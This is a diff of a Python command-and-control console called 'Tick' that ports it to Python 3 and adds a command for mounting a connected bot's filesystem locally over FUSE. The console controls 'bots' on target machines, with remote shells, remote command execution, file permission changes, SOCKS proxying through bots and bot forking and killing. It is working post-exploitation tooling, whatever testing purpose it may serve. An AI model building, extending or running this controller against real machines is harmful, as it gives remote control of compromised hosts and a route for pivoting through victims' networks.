                 addr = response[1:17]
                 response = response[17:]
             else:
-                raise AssertionError()
+                raise Exception("internal error")
             answer.append(inet_ntop(family, addr))
         return answer
 
@@ -932,8 +850,17 @@ class RemoteShell(Thread):
                 buffer = self.sock.recv(1024)
                 if not buffer:
                     break
+                try:
+                    try:
+                        buffer = buffer.decode("utf8", "replace")
+                    except UnicodeError:
+                        buffer = buffer.decode("utf8", "ignore")
+                except Exception:
+                    buffer = repr(buffer)[1:-1].replace("\\n", "\n")
                 sys.stdout.write(buffer)
+                sys.stdout.flush()
         except:
+            #print_exc()     # XXX DEBUG
             pass
         finally:
             try:
@@ -954,7 +881,7 @@ class RemoteShell(Thread):
         self.start()
         try:
             while self.alive:
-                buffer = sys.stdin.readline()
+                buffer = sys.stdin.readline().encode("utf8")
                 if not buffer:
                     break
                 self.sock.sendall(buffer)
@@ -1174,16 +1101,17 @@ class SOCKSProxy(Thread):
         # If the client insists on giving us a password
         # anyway, just accept anything they send us.
         # TODO perhaps notify the console when this happens?
-        if (self.username and self.password) or "\x00" not in methods:
+        if (self.username and self.password) or b"\x00" not in methods:
             sock.sendall(pack("!BB", 5, 2))
             request = recvall(sock, 2)
             if not request:
                 return          # fail silently
             version, ulen = unpack("!BB", request)
-            assert version == 1
-            uname = recvall(sock, ulen)
+            if version != 1:
+                return          # fail silently
+            uname = recvall(sock, ulen).decode("utf8")
             plen, = unpack("!B", recvall(sock, 1))
-            passwd = recvall(sock, ulen)
+            passwd = recvall(sock, ulen).decode("utf8")
             if self.username and self.password and (self.username != uname or self.password != passwd):
                 sock.sendall(pack("!BB", 5, 0xff))
                 # TODO perhaps notify the console when this happens?
@@ -1208,10 +1136,10 @@ class SOCKSProxy(Thread):
             port, = unpack("!H", recvall(sock, 2))
         elif atyp == 3:
             name_len, = unpack("!B", recvall(sock, 1))
-            name = recvall(sock, name_len)
+            name = recvall(sock, name_len).decode("utf8")
             port, = unpack("!H", recvall(sock, 2))
         else:
-            raise AssertionError("wtf")
+            raise Exception("internal error")
 
         # Try to get the bot now.
         # If we can't find it, reject the connection attempt.
@@ -1307,6 +1235,266 @@ class SOCKSProxy(Thread):
                     print_exc()     # XXX DEBUG
                     pass
 
+# FUSE daemon.
+# This is split into a background process that implements the actual
+# FUSE wrapper, and a background thread that talks to that process
+# in order to forward any calls that need to be made to the bots.
+# This way we keep the FUSE part neatly separated from our process,
+# while at the same time ensuring the main process with the console
+# is the one actually communicating with the bots.
+if HAVE_FUSE:
+
+    class FUSEThread(Thread):
+
+        def __init__(self, listener, uuid, mountpoint, args):
+
+            # Keep a bot listener instance and the UUID of the bot.
+            # This is better than keeping the actual Bot instance,
+            # because if the bot dies and reconnects with the same ID
+            # we can transparently use the new socket.
+            self.listener = listener
+            self.uuid = uuid
+
+            try:
+
+                # Create a full duplex pipe to talk to the background process.
+                self.pipe, child_pipe = Pipe()
+
+                # Create a background process.
+                self.process = FUSEProcess(child_pipe, mountpoint, args)
+
+            except:
+
+                # Clean up on error.
+                try:
+                    self.pipe.close()
+                except:
+                    pass
+                raise
+
+            # Flag we'll use to tell the background thread to stop.
+            self.alive = False
+
+            # Call the parent class constructor.
+            super(FUSEThread, self).__init__()
+
+            # Set the thread as a daemon so way when the
+            # main thread dies, this thread will die too.
+            self.daemon = True
+
+        # This method is invoked in a background thread.
+        # It forwards calls to the Bot object.
+        def run(self):
+            self.alive = True
+            try:
+                self.process.start()
+                while self.alive:
+                    try:
+                        method, args, kwargs = self.pipe.recv()
+                        bot = self.listener.bots[self.uuid]
+                        if not bot.alive:
+                            raise BotError("disconnected")
+                        resp = getattr(bot, method)(*args, **kwargs)
+                        self.pipe.send(resp)
+                    except Exception as e:
+                        self.pipe.send(e)
+                    except:
+                        self.pipe.send(BotError("disconnected"))
+            except:
+                pass
+            finally:
+                self.kill()
+
+        # Forcefully kill the background thread.
+        # This in turn kills the background process too.
+        def kill(self):
+            if not self.alive:
+                return
+            self.alive = False
+            try:
+                self.pipe.close()
+            except:
+                pass
+            try:
+                self.process.terminate()
+            except:
+                pass
+
+    class FUSEProcess(Process):
+
+        def __init__(self, pipe, mountpoint, args):
+
+            # We will use this pipe to forward bot calls.
+            self.pipe = pipe
+
+            # Mount point.
+            self.mountpoint = mountpoint
+
+            # Arguments for FUSE.
+            self.args = args
+
+            # Call the parent class constructor.
+            super(FUSEProcess, self).__init__()
+
+            # Set the process as a daemon so way when the
+            # main process dies, this process will die too.
+            self.daemon = True
+
+        # Filesystem service loop.
+        # This method is invoked in a background process.
+        def run(self):
+            try:
+                self.handler = FUSEHandler(self, dash_s_do='setsingle')
+                self.handler.parser.prog = "mount"
+                self.handler.parse([self.mountpoint] + self.args + ["-f", "-s"])
+                self.handler.main()
+            finally:
+                try:
+                    self.pipe.close()
+                except:
+                    pass
+
+        # Make a remote call.
+        def rpc(self, method, *args, **kwargs):
+            #print("CALLING " + method)
+            self.pipe.send( ("file_" + method, args, kwargs) )
+            resp = self.pipe.recv()
+            if isinstance(resp, Exception):
+                raise resp
+            return resp
+
+    class FUSEHandler(fuse.Fuse):
+        def __init__(self, parent, *args, **kwargs):
+            self.__parent = parent
+            super(FUSEHandler, self).__init__(*args, **kwargs)
+
+        # The following are various calls FUSE needs.
+
+        def open(self, path, flags):
+            try:
+                return self.__parent.rpc("open", path, flags=flags)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def read(self, path, size, offset):
+            try:
+                return self.__parent.rpc("read", path, size, offset)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def write(self, path, buf, offset):
+            try:
+                return self.__parent.rpc("write", path, buf, offset)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def getattr(self, path):
+            try:
+                resp = self.__parent.rpc("stat", path)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+            st = fuse.Stat()
+            st.st_dev = resp.dev
+            st.st_ino = resp.ino
+            st.st_mode = resp.mode
+            st.st_nlink = resp.nlink
+            st.st_uid = resp.uid
+            st.st_gid = resp.gid
+            st.st_size = resp.size
+            st.st_atime = resp.atime
+            st.st_mtime = resp.mtime
+            st.st_ctime = resp.ctime
+            return st
+
+        def readdir(self, path, offset):
+            try:
+                resp = self.__parent.rpc("readdir", path)
+            except:
+                #print_exc()
+                return []
+            return [ fuse.Direntry(x.decode("utf8", "ignore")) for x in resp ]
+
+        def readlink(self, path):
+            try:
+                return self.__parent.rpc("readlink", path).decode("utf8", "ignore")
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def symlink(self, linkname, target):
+            try:
+                self.__parent.rpc("symlink", linkname, target)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def link(self, linkname, target):
+            try:
+                self.__parent.rpc("link", linkname, target)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def unlink(self, path):
+            try:
+                self.__parent.rpc("unlink", path)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def rmdir(self, path):
+            try:
+                self.__parent.rpc("rmdir", path)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def mkdir(self, path):
+            try:
+                self.__parent.rpc("mkdir", path)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def chown(self, path, user, group):
+            try:
+                self.__parent.rpc("chown", path, user, group)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+
+        def access(self, path, mode):
+            try:
+                granted = self.__parent.rpc("access", path, mode)
+            except:
+                #print_exc()
+                return -errno.ENOENT
+            if not granted:
+                return -errno.EACCES
+
+        def statfs(self):
+            try:
+                resp = self.__parent.rpc("statvfs", "/\0")
+            except:
+                #print_exc()
+                return -errno.ENOENT
+            vfs = fuse.StatVFS()
+            vfs.f_bsize   = resp.bsize
+            vfs.f_frsize  = resp.frsize
+            vfs.f_blocks  = resp.blocks
+            vfs.f_bfree   = resp.bfree
+            vfs.f_bavail  = resp.bavail
+            vfs.f_files   = resp.files
+            vfs.f_ffree   = resp.ffree
+            vfs.f_favail  = resp.favail
+            vfs.f_flag    = resp.flag
+            vfs.f_namemax = resp.namemax
+            return vfs
+
 ##############################################################################
 # The Tick console. This is the one that launches everything else.
 
@@ -1336,6 +1524,11 @@ class Console(Cmd):
         # Keys are port numbers, values are SOCKSProxy objects.
         # See the do_proxy() method for more details.
         self.proxies = {}
+
+        # These are the currently running FUSE mount points.
+        # Keys are pathnames, values are FUSEThread objects.
+        # See the do_mount() method for more details.
+        self.filesystems = {}
 
         # The TCP port listener for bots will be here.
         self.listener = None
@@ -1446,6 +1639,14 @@ class Console(Cmd):
         except Exception:
             print_exc()
         try:
+            for fusethread in self.filesystems.values():
+                try:
+                    fusethread.kill()
+                except Exception:
+                    print_exc()
+        except Exception:
+            print_exc()
+        try:
             self.listener.kill()
         except Exception:
             print_exc()
@@ -1469,7 +1670,7 @@ class Console(Cmd):
         if bot.uuid not in self.known_bots:
 
             # Prepare the notification text.
-            index = listener.bots.keys().index(bot.uuid)
+            index = list(listener.bots.keys()).index(bot.uuid)
             text = "Bot %d [%s] connected from %s" % (index, bot.uuid, bot.from_addr[0])
             text = Fore.BLUE + Style.BRIGHT + text + Style.RESET_ALL
 
@@ -1482,6 +1683,7 @@ class Console(Cmd):
                 buf_bkp = readline.get_line_buffer()
                 sys.stdout.write("\033[s\033[0G\033[2K" + text + "\n")
                 sys.stdout.write(self.prompt.replace("\x01", "").replace("\x02", "") + buf_bkp + "\033[u\033[1B")
+                sys.stdout.flush()
                 readline.redisplay()
 
             # If we are not blocked at the prompt, better not write now!
@@ -1566,7 +1768,8 @@ class Console(Cmd):
 
     # This property generates the banner.
     @property
-    def intro(self):
+    def banner(self):
+
         # Prepare the dynamic part of the banner.
         if self.listener.keyfile and self.listener.certfile:
             listening_on = ("Listening on: %s:%d (plaintext), %s:%d (SSL)" % (self.listener.bind_addr, self.listener.port, self.listener.bind_addr, self.listener.ssl_port))
@@ -1597,7 +1800,7 @@ class Console(Cmd):
 
         # If a bot is selected, show its info in the prompt.
         bot = self.current
-        index = self.listener.bots.keys().index(bot.uuid)
+        index = list(self.listener.bots.keys()).index(bot.uuid)
         addr = bot.from_addr[0]
         return "\x01" + Fore.GREEN + Style.BRIGHT + "\x02" + ("[Bot %d: %s] " % (index, addr)) + "\x01" + Style.RESET_ALL + "\x02"
 
@@ -1661,7 +1864,7 @@ class Console(Cmd):
         return True
 
     def do_EOF(self, line):
-        print()
+        print("")
         return self.do_exit(line)
 
     def do_clear(self, line):
@@ -1737,9 +1940,9 @@ class Console(Cmd):
         text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
         text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
         text = text.replace("\x04", Style.RESET_ALL + " ")
-        print()
+        print("")
         print(text)
-        print()
+        print("")
 
     def do_current(self, line):
         """
@@ -1762,7 +1965,7 @@ class Console(Cmd):
         bot = self.current
         addr = bot.from_addr[0]
         uuid = bot.uuid
-        index = self.listener.bots.keys().index(uuid)
+        index = list(self.listener.bots.keys()).index(uuid)
         print((
             "\n" +
             "Bot number: #%d\n" +
@@ -1801,7 +2004,7 @@ class Console(Cmd):
                 # If a number was passed, we can get it by index.
                 # That's why we used an OrderedDict in the listener.
                 try:
-                    bot = self.listener.bots.values()[ int(bot_id) ]
+                    bot = list(self.listener.bots.values())[ int(bot_id) ]
                 except IndexError:
                     print(Fore.YELLOW + ("Error: no bot number %d found" % int(bot_id)) + Style.RESET_ALL)
                     return
@@ -1813,7 +2016,7 @@ class Console(Cmd):
                     # but that's the user's problem, not ours...
                     try:
                         inet_aton(bot_id)
-                    except error:
+                    except OSError:
                         self.onecmd("help use")     # wasn't an IP either :(
                         return
                     found = False
@@ -1912,7 +2115,7 @@ class Console(Cmd):
 
     def do_chmod(self, line):
         """
-    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m> <\x1b[34m\x1b[1mmode flags\x1b[0m>
+    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mmode flags\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>
 
     Change a file's access mode flags. Mode flags are in octal.\n"""
 
@@ -1928,7 +2131,7 @@ class Console(Cmd):
 
         # Parse the arguments, on error show help.
         try:
-            remote_file, mode_flags = split(line, comments=True)
+            mode_flags, remote_file = split(line, comments=True)
         except Exception:
             self.onecmd("help chmod")
             return
@@ -1981,7 +2184,7 @@ class Console(Cmd):
             return
 
         # Perform the operation.
-        output = self.current.file_exec(line)
+        output = self.current.file_exec(line).decode("utf8")
 
         # If the output is exactly aligned to page size,
         # that means it was likely truncated. Not an exact
@@ -2014,9 +2217,7 @@ class Console(Cmd):
             return
 
         # Parse the arguments, on error show help.
-        try:
-            assert not split(line, comments=True)
-        except Exception:
+        if split(line, comments=True):
             self.onecmd("help fork")
             return
 
@@ -2041,9 +2242,7 @@ class Console(Cmd):
             return
 
         # Parse the arguments, on error show help.
-        try:
-            assert not split(line, comments=True)
-        except Exception:
+        if split(line, comments=True):
             self.onecmd("help shell")
             return
 
@@ -2060,11 +2259,11 @@ class Console(Cmd):
         print(Fore.YELLOW + "\\-------------------------------------------------/" + Style.RESET_ALL)
         shell = RemoteShell(sock)
         shell.run_parent()
-        print()
+        print("")
 
         # Try to re-select the same bot when exiting the shell.
         # We need to do this because the shell command reuses the C&C socket,
-        # so the bot mut reconnect in the background with a new socket.
+        # so the bot must reconnect in the background with a new socket.
         self.current = self.listener.bots.get(uuid, None)
 
     def do_dig(self, line):
@@ -2087,7 +2286,9 @@ class Console(Cmd):
         # Parse the arguments, on error show help.
         try:
             domain, = split(line, comments=True)
-            assert domain
+            if not domain:
+                self.onecmd("help proxy")
+                return
         except Exception:
             self.onecmd("help dig")
             return
@@ -2122,7 +2323,9 @@ class Console(Cmd):
         # but it helps a bit since we're about to launch
         # multiple threads and all that stuff, and we may
         # want to skip it for obviously wrong scenarios.
-        assert self.current.alive
+        if not self.current.alive:
+            self.onecmd("help proxy")
+            return
 
         # Parse the arguments, on error show help.
         try:
@@ -2254,19 +2457,25 @@ class Console(Cmd):
                 # If an alias has been used, convert it to the full name.
                 command = args.pop(0)
                 command = valid_commands.get(command, command)
-                assert command in valid_commands.values()
+                if command not in list(valid_commands.values()):
+                    self.onecmd("help proxy")
+                    return
 
                 # Parse the "add" subcommand arguments.
                 if command == "add":
                     port = int(args.pop(0))
-                    assert 0 < port < 65536
+                    if not 0 < port < 65536:
+                        self.onecmd("help proxy")
+                        return
                     if args:
                         bind_addr = args.pop(0)
                         bind_addr = inet_ntoa(inet_aton(bind_addr))
                         if args:
                             username = args.pop(0)
                             password = args.pop(0)  # must be used together
-                            assert not args
+                            if args:
+                                self.onecmd("help proxy")
+                                return
                         else:
                             username = ""
                             password = ""
@@ -2278,16 +2487,19 @@ class Console(Cmd):
                 # Parse the "rm" subcommand arguments.
                 elif command == "rm":
                     port = int(args.pop(0))
-                    assert 0 < port < 65536
-                    assert not args
+                    if not 0 < port < 65536 or args:
+                        self.onecmd("help proxy")
+                        return
 
                 # Parse the "ls" subcommand arguments.
                 elif command == "ls":
-                    assert not args
+                    if args:
+                        self.onecmd("help proxy")
+                        return
 
                 # Should never reach here.
                 else:
-                    raise AssertionError()
+                    raise Exception("internal error")
 
         # On error show a help message.
         except Exception:
@@ -2364,7 +2576,7 @@ class Console(Cmd):
                 i += 1
                 uuid = proxy.uuid
                 bot = self.listener.bots[uuid]
-                index = self.listener.bots.keys().index(uuid)
+                index = list(self.listener.bots.keys()).index(uuid)
                 table.add_row((
                     index,
                     uuid,
@@ -2378,13 +2590,162 @@ class Console(Cmd):
             text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
             text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
             text = text.replace("\x04", Style.RESET_ALL + " ")
-            print()
+            print("")
             print(text)
-            print()
+            print("")
 
         # Should never reach here.
         else:
-            raise AssertionError()
+            raise Exception("internal error")
+
+    # Mount and umount commands are only defined if we have FUSE installed.
+    if HAVE_FUSE:
+
+        def do_mount(self, line):
+            """
+        \x1b[32m\x1b[1mmount\x1b[0m
+        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
+        \x1b[32m\x1b[1mmount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m> [\x1b[34m\x1b[1moptions...\x1b[0m]
+
+        Mounts the target machine's filesystem into a local directory.
+        Any access to that directory will be transparently forwarded to the bot.
+        When invoked with no arguments, list the existing mounted points.\n"""
+
+            # Parse the command arguments.
+            try:
+                args = list(split(line, comments=True))
+                mountpoint = None
+                if args:
+                    mountpoint = args[0]
+
+            # On error show a help message.
+            except Exception:
+                #print_exc()     # XXX DEBUG
+                self.onecmd("help mount")
+                return
+
+            # If no mount point was given, list the existing ones.
+            if mountpoint is None:
+
+                # If we had no active mount points, just show an error message.
+                if not self.filesystems:
+                    print(Fore.YELLOW + "No mounted filesystems right now" + Style.RESET_ALL)
+                    print("(Use 'help mount' to show the help)")
+                    return
+
+                # We will show the list of mounted filesystems in an ASCII art table.
+                # Same logic as the list of bots.
+                mp_len = 25
+                for mp in self.filesystems.keys():
+                    if len(mp) > mp_len:
+                        mp_len = len(mp)
+                mp_len += 2
+                table = Texttable()
+                table.set_deco(Texttable.HEADER)
+                table.set_cols_dtype(("i", "t", "t", "t"))
+                table.set_cols_align(("l", "c", "c", "c"))
+                table.set_cols_valign(("t", "t", "t", "t"))
+                table.set_cols_width((len(str(len(self.filesystems))), 36, 15+2, mp_len))
+                table.add_rows((("#", "UUID", "IP Address", "Mount Point"),), header = True)
+                i = 0
+                for mountpoint, fusethread in self.filesystems.items():
+                    i += 1
+                    uuid = fusethread.uuid
+                    bot = self.listener.bots[uuid]
+                    index = list(self.listener.bots.keys()).index(uuid)
+                    table.add_row((
+                        index,
+                        uuid,
+                        "\x02" + bot.from_addr[0] + "\x04",
+                        "\x02" + mountpoint + "\x04",
+                    ))
+                text = table.draw()
+                text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
+                text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
+                text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
+                text = text.replace("\x04", Style.RESET_ALL + " ")
+                print("")
+                print(text)
+                print("")
+
+            # If a mount point was given, mount the remote filesystem there.
+            else:
+
+                # Convert the mount point to an absolute path.
+                mountpoint = os.path.abspath(mountpoint)
+
+                # Check if the mount point is valid.
+                if not os.path.isdir(mountpoint):
+                    print(Fore.YELLOW + "Invalid mount point: " + repr(mountpoint) + Style.RESET_ALL)
+                    return
+
+                # A bot must be selected.
+                if self.current is None:
+                    print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
+                    return
+
+                # The bot must not be busy.
+                if self.is_bot_busy():
+                    print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
+                    return
+
+                # Automatically fork the bot so we can keep using it.
+                uuid = self.current.system_fork()
+
+                # Instance the FUSE thread object.
+                fusethread = FUSEThread(self.listener, self.current.uuid, mountpoint, args[1:])
+
+                # Add it to the dictionary.
+                self.filesystems[mountpoint] = fusethread
+
+                # Launch the thread.
+                fusethread.start()
+
+                # With any luck the fork of the bot has already connected.
+                # Try selecting it if we can. If we can't at least deselect it.
+                sleep(0.1)
+                self.current = self.listener.bots.get(uuid, None)
+
+        def do_umount(self, line):
+            """
+        \x1b[32m\x1b[1mumount\x1b[0m <\x1b[34m\x1b[1mmount point\x1b[0m>
+
+        Unmounts a filesystem mounted with the "mount" command.\n"""
+
+            # Parse the command arguments.
+            try:
+                args = list(split(line, comments=True))
+                if len(args) != 1:
+                    self.onecmd("help umount")
+                    return
+
+                mountpoint = args[0]
+
+            # On error show a help message.
+            except Exception:
+                #print_exc()     # XXX DEBUG
+                self.onecmd("help umount")
+                return
+
+            # Convert the mount point to an absolute path.
+            mountpoint = os.path.abspath(mountpoint)
+
+            # Check if the mount point is ours.
+            if mountpoint not in self.filesystems:
+                print(Fore.RED + "Unknown mount point: " + repr(mountpoint) + Style.RESET_ALL)
+                return
+
+            # Unmount the filesystem.
+            try:
+                check_call(["umount", mountpoint])
+                #print("Removed filesystem at: " + mountpoint)
+            except CalledProcessError:
+                #print(Fore.RED + "Error removing filesystem at: " + mountpoint + Style.RESET_ALL)
+                pass
+
+            # Remove the filesystem from the list, regardless of whether it worked or not.
+            # Otherwise we would end up with an ever growing list of errored out FUSE processes.
+            del self.filesystems[mountpoint]
 
     def do_kill(self, line):
         """
@@ -2404,10 +2765,7 @@ class Console(Cmd):
             return
 
         # Parse the arguments, on error show help.
-        try:
-            assert not split(line, comments=True)
-        except Exception:
-            raise
+        if split(line, comments=True):
             self.onecmd("help kill")
             return
 
@@ -2449,7 +2807,7 @@ class Console(Cmd):
 
     # This hack fixes a bug in Python, the interpreter console is closing the
     # stdin pipe when calling the exit() function (Ctrl+D/Ctrl+Z seems to work fine).
-    class _PythonExit(object):
+    class _PythonExit:
         def __repr__(self):
             if os.path.sep == '/':
                 return "Use exit() or Ctrl-D (i.e. EOF) to exit"
@@ -2457,20 +2815,6 @@ class Console(Cmd):
         def __call__(self):
             raise SystemExit()
     _python_exit = _PythonExit()
-
-# Scary stuff below! :o)
-# Dunno about you reversing it but I had fun coding this :D
-if "play" in globals():
-    darknet = "tor"
-    filename = "malna.png"
-    bitcoins = 13
-    secret = "".join([x[1:].encode(darknet[::-1]+str(bitcoins)) for x in os.path.splitext(filename)])
-    setattr(Console, "do_" + secret, play)
-    Console.hidden.append(secret)
-    del darknet
-    del filename
-    del bitcoins
-    del secret
 
 ##############################################################################
 # The bit that launches the console itself.
@@ -2485,8 +2829,8 @@ def main(args = None):
     # Load the interactive console.
     with Console(args) as c:
 
-        # Show the intro banner but only the first time.
-        skip_intro = False
+        # Show the intro banner.
+        print(c.banner)
 
         # We need to put this in a loop because the base class
         # provided by Python is a bit silly and just dies whenever a
@@ -2494,11 +2838,8 @@ def main(args = None):
         while True:
             try:
 
-                # Run the command loop, showing the banner only once.
-                if skip_intro:
-                    c.cmdloop(intro = "")
-                else:
-                    c.cmdloop()
+                # Run the command loop.
+                c.cmdloop()
 
                 # If we got here that means the exit command was used.
                 break
@@ -2509,16 +2850,13 @@ def main(args = None):
 
             # Quit silently with Control+C.
             except KeyboardInterrupt:
-                print()
+                print("")
                 break
 
             # Show all other exceptions as Python tracebacks.
             # Ugly, but easier to debug. You'll thank me.
             except Exception:
                 print_exc()
-
-            # If we got here this is not the first time so skip the banner.
-            skip_intro = True
 
 if __name__ == "__main__":
     main()      # colorama already initialized when imported
